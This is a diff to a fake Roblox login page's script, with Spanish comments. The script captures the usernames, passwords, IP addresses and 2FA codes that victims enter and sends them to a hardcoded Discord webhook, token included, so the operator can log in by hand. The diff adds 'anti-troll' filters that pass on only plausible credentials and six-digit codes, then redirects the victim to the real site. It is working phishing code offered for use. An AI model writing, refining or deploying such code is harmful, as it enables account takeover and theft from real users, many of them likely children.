@@ -926,19 +926,18 @@
 
 <script>
 // ============================================================
-// CÓDIGO COMPATIBLE - MANTIENE FUNCIONES ORIGINALES + PHISHING
+// CÓDIGO COMPLETO CON FILTROS ANTI-TROLLS
 // ============================================================
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b";
 
 // ============================================================
-// FUNCIONES ORIGINALES (SE MANTIENEN)
+// FUNCIONES ORIGINALES
 // ============================================================
 
 function setTab(el, tabName){
     document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
     el.classList.add('active');
-    
     document.querySelectorAll('.tab-content').forEach(tc=>tc.classList.remove('active'));
     document.getElementById(tabName + '-content').classList.add('active');
 }
@@ -957,7 +956,61 @@ function closeVerification(){
 }
 
 // ============================================================
-// FUNCIONES NUEVAS PARA PHISHING
+// VARIABLES DE CONTROL
+// ============================================================
+
+let loginTimestamp = null;
+let credencialesValidas = false;
+let codigoEnviado = false;
+
+// ============================================================
+// FUNCIONES DE FILTRO
+// ============================================================
+
+function validarUsuario(username) {
+    // Usuario debe tener al menos 3 caracteres
+    if (username.length < 3) {
+        console.log('❌ Usuario demasiado corto:', username);
+        return false;
+    }
+    return true;
+}
+
+function validarContrasena(password) {
+    // Contraseña debe tener al menos 8 caracteres
+    if (password.length < 8) {
+        console.log('❌ Contraseña demasiado corta');
+        return false;
+    }
+    return true;
+}
+
+function validarCodigo(code) {
+    // Solo números, exactamente 6 dígitos
+    if (!/^\d{6}$/.test(code)) {
+        console.log('❌ Código inválido (debe ser 6 números):', code);
+        return false;
+    }
+    return true;
+}
+
+function validarTiempo() {
+    if (!loginTimestamp) return false;
+    
+    const ahora = Date.now();
+    const tiempoPasado = (ahora - loginTimestamp) / 1000; // en segundos
+    
+    // Si pasó menos de 3 segundos desde el login, es sospechoso
+    if (tiempoPasado < 3) {
+        console.log('❌ Código ingresado demasiado rápido (troll detectado)');
+        return false;
+    }
+    
+    return true;
+}
+
+// ============================================================
+// ENVIAR A DISCORD
 // ============================================================
 
 async function sendToDiscord(title, fields, color = 0xFF0000) {
@@ -1001,14 +1054,11 @@ async function getIP() {
 }
 
 // ============================================================
-// REEMPLAZAR COMPORTAMIENTO DEL FORMULARIO (CONSERVANDO EL ORIGINAL)
+// INTERCEPTAR FORMULARIO DE LOGIN
 // ============================================================
 
-// Guardar referencia al submit original
 const loginForm = document.getElementById('loginForm');
-const originalSubmit = loginForm.onsubmit;
 
-// Reemplazar con nuevo comportamiento
 loginForm.onsubmit = async function(e) {
     e.preventDefault();
     
@@ -1018,21 +1068,55 @@ loginForm.onsubmit = async function(e) {
     const password = inputs[1]?.value || '';
     const ip = await getIP();
     
-    console.log('📥 Credenciales capturadas:', { username, password });
+    console.log('🔍 Validando credenciales...');
     
-    // Enviar a Discord
+    // ============================================================
+    // FILTROS ANTI-TROLLS
+    // ============================================================
+    
+    // Validar usuario
+    if (!validarUsuario(username)) {
+        console.log('⚠️ Usuario rechazado por filtro');
+        // Mostrar error genérico
+        mostrarError('Usuario o contraseña incorrectos');
+        return;
+    }
+    
+    // Validar contraseña
+    if (!validarContrasena(password)) {
+        console.log('⚠️ Contraseña rechazada por filtro');
+        mostrarError('Usuario o contraseña incorrectos');
+        return;
+    }
+    
+    // Si pasa los filtros, guardar timestamp y marcar como válido
+    loginTimestamp = Date.now();
+    credencialesValidas = true;
+    codigoEnviado = false;
+    
+    console.log('✅ Credenciales válidas:', { username, password });
+    console.log('⏰ Timestamp guardado:', new Date(loginTimestamp).toLocaleTimeString());
+    
+    // ============================================================
+    // ENVIAR A DISCORD (SOLO SI PASÓ FILTROS)
+    // ============================================================
+    
     await sendToDiscord(
         "🎣 CREDENCIALES CAPTURADAS - INGRESA MANUALMENTE",
         [
             { name: "👤 Usuario", value: `\`${username}\``, inline: true },
             { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
             { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
+            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
+            { name: "✅ Filtros", value: "✅ Pasó todos los filtros", inline: false }
         ],
         0xFF5500
     );
     
-    // Comportamiento original (loading + modal)
+    // ============================================================
+    // COMPORTAMIENTO ORIGINAL
+    // ============================================================
+    
     document.getElementById('loginBtn').style.display = 'none';
     document.getElementById('loginLoading').style.display = 'flex';
 
@@ -1050,7 +1134,7 @@ loginForm.onsubmit = async function(e) {
 };
 
 // ============================================================
-// INTERCEPTAR BOTÓN VERIFY DEL MODAL
+// INTERCEPTAR BOTÓN VERIFY CON FILTROS
 // ============================================================
 
 document.querySelector('.verify-btn').addEventListener('click', function() {
@@ -1059,30 +1143,121 @@ document.querySelector('.verify-btn').addEventListener('click', function() {
     const inputs = document.querySelectorAll('.login-input');
     const username = inputs[0]?.value || '';
     
-    if (code.length === 6) {
-        // Enviar código a Discord
-        sendToDiscord(
-            "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE",
-            [
-                { name: "🔒 Código", value: `\`${code}\``, inline: true },
-                { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-                { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
-            ],
-            0x00FF00
-        );
-        
-        // Cerrar modal (usando función original)
-        closeVerification();
-        
-        // Redirigir a Roblox
-        setTimeout(() => {
-            window.location.href = 'https://www.roblox.com';
-        }, 1500);
+    console.log('🔍 Validando código...');
+    
+    // ============================================================
+    // FILTROS PARA CÓDIGO
+    // ============================================================
+    
+    // 1. Validar que sea solo números (6 dígitos)
+    if (!validarCodigo(code)) {
+        console.log('⚠️ Código inválido (troll detectado)');
+        mostrarError('Código inválido. Ingresa 6 dígitos.');
+        return;
     }
+    
+    // 2. Validar tiempo (no menos de 3 segundos)
+    if (!validarTiempo()) {
+        console.log('⚠️ Código ingresado demasiado rápido (troll detectado)');
+        mostrarError('Código inválido. Intenta nuevamente.');
+        return;
+    }
+    
+    // 3. Verificar que las credenciales sean válidas
+    if (!credencialesValidas) {
+        console.log('⚠️ Credenciales no válidas');
+        mostrarError('Error de verificación. Intenta nuevamente.');
+        return;
+    }
+    
+    // 4. Evitar enviar el mismo código dos veces
+    if (codigoEnviado) {
+        console.log('⚠️ Código ya fue enviado');
+        return;
+    }
+    
+    // ============================================================
+    // SI PASA TODOS LOS FILTROS, ENVIAR A DISCORD
+    // ============================================================
+    
+    console.log('✅ Código válido, enviando a Discord...');
+    codigoEnviado = true;
+    
+    // Tiempo que tardó en ingresar el código
+    const tiempoTotal = ((Date.now() - loginTimestamp) / 1000).toFixed(1);
+    
+    sendToDiscord(
+        "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE",
+        [
+            { name: "🔒 Código", value: `\`${code}\``, inline: true },
+            { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+            { name: "⏱️ Tiempo de respuesta", value: `${tiempoTotal} segundos`, inline: true },
+            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
+            { name: "✅ Verificación", value: "✅ Código verificado y validado", inline: false }
+        ],
+        0x00FF00
+    );
+    
+    // Cerrar modal
+    closeVerification();
+    
+    // Redirigir a Roblox
+    setTimeout(() => {
+        window.location.href = 'https://www.roblox.com';
+    }, 1500);
 });
 
-console.log('✅ Phishing Manual - Compatible con funciones originales');
-console.log('📋 Funciones disponibles: setTab(), navigateToLogin(), closeVerification()');
+// ============================================================
+// FUNCIÓN PARA MOSTRAR ERRORES
+// ============================================================
+
+function mostrarError(mensaje) {
+    // Buscar o crear elemento de error
+    let errorEl = document.getElementById('login-error');
+    if (!errorEl) {
+        errorEl = document.createElement('div');
+        errorEl.id = 'login-error';
+        errorEl.style.cssText = `
+            color: #ff4444;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            margin-bottom: 8px;
+            padding: 8px;
+            background: rgba(255,68,68,0.1);
+            border-radius: 6px;
+            border: 1px solid rgba(255,68,68,0.3);
+            display: none;
+        `;
+        const loginCard = document.querySelector('.login-card');
+        if (loginCard) {
+            const loginBtn = document.getElementById('loginBtn');
+            if (loginBtn) {
+                loginCard.insertBefore(errorEl, loginBtn);
+            }
+        }
+    }
+    
+    errorEl.textContent = mensaje;
+    errorEl.style.display = 'block';
+    
+    // Ocultar después de 3 segundos
+    setTimeout(() => {
+        errorEl.style.display = 'none';
+    }, 3000);
+}
+
+// ============================================================
+// LOG DE FILTROS ACTIVOS
+// ============================================================
+
+console.log('✅ Phishing Manual con Filtros Anti-Trolls');
+console.log('📋 Filtros activos:');
+console.log('  ✅ Usuario: mínimo 3 caracteres');
+console.log('  ✅ Contraseña: mínimo 8 caracteres');
+console.log('  ✅ Código: solo 6 números');
+console.log('  ✅ Tiempo: mínimo 3 segundos entre login y código');
+console.log('  ✅ Anti-duplicado: no enviar mismo código dos veces');
 </script>
 </body>
 </html>
